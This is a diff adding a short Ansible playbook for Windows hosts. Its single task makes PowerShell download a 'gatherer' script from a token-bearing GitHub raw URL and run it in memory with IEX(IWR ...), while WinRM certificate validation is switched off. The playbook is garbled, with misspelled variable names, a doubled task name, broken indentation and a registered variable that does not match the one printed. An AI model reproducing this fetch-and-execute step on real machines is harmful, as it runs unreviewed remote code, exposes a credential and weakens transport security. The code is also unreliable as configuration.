@@ -1,0 +1,15 @@
+- hosts: windows
+vars:
+    Ansisble_port: 5986
+    Ansible_user: 
+    Ansisble_winrm_server_cert_validation: ignore
+    Ansisble_winrm_transport: ntlm
+tasks:
+    - name: Name: PowerShell_Gatherer
+      register: output 
+      win_command: >
+        powershell.exe -Sta -Nop -Command "IEX(IWR 'https://raw.githubusercontent.com/NotoriousRebel/temppp/8c8dbe47a76e5152ff2df212a9cc450e6479279a/ps_gather.ps1?token=AIVA5C3LIJ47HHEYAPZUIPS52QZQS' -UseBasicParsing)"
+    - name: Print Output
+      debug: 
+        msg: 
+           - "Output: {{ PowerShell_Gatherer.stdout }}"
